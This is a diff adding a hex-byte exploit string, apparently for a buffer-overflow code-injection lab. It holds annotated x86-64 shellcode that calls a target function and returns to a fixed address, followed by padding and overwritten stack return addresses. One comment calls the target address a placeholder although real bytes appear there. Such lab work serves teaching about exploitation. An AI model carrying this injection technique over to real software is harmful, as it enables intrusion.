@@ -1,0 +1,22 @@
+48 81 EC 80 00 00 00    # subq $0x80, %rsp #
+C7 04 24 01 00 00 00    # movl $1, 0x0(%rsp) #
+C7 44 24 04 04 00 00 00 # movl $4, 0x4(%rsp) #
+C7 44 24 08 08 00 00 00 # movl $8, 0x8(%rsp) #
+C7 44 24 0C FF FF FF FF # movl $-1, 0xc(%rsp) #
+48 89 E7                # mov %rsp, %rdi #
+48 C7 C0 d8 09 40 00    # mov target地址 → %rax（占位 FF） #
+FF D0                   # call *%rax #
+48 81 C4 80 00 00 00    # addq $0x80, %rsp #
+68 E4 0A 40 00          # push $0x400AE4 #
+C3                      # ret #
+
+
+00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+
+
+D0 FF FF 03 00 00 00 00
+
+50 ff ff 03 00 00 00 00
